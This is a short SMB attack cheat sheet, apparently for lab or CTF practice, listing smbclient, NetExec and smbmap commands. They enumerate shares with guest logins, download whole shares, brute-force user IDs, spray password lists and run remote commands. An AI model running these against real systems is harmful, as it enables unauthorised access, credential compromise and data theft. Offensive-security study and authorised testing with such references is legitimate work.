

> Basic
```bash 
smbclient -L //10.10.11.35/

smbclient  //10.10.11.35//<share_name>

smbclient //10.10.11.174/support-tools -U guest
```

>Download all files
``` shell
smbclient  //IP/SHARE

recure ON 

prompt OFF

mget *

#examplle
smbclient //192.168.195.175/Password\ Audit -U 'V.Ventz' -c 'prompt OFF;recurse ON;lcd '~/Downloads/file';mget *'
```


>Basic
```bash
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute
nxc smb 10.10.11.35 -u 'guest' -p '' --shares
nxc smb {IP} -u user.txt -p password.txt #we can add --continue-on-success

#Dump Data
nxc smb ${NASIP} -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True 

```


>Basic
```sh
smbmap -H $IP

smbmap -R <Share> -H $IP

#Dump  file
smbmap -r <ShareName> -H $IP -A FIle -q

#exec commmands
smbmap -H {IP} -u admin -P 'Password' -x 'whoami ' 

#domain

smbmap -d $domani -u ....
```
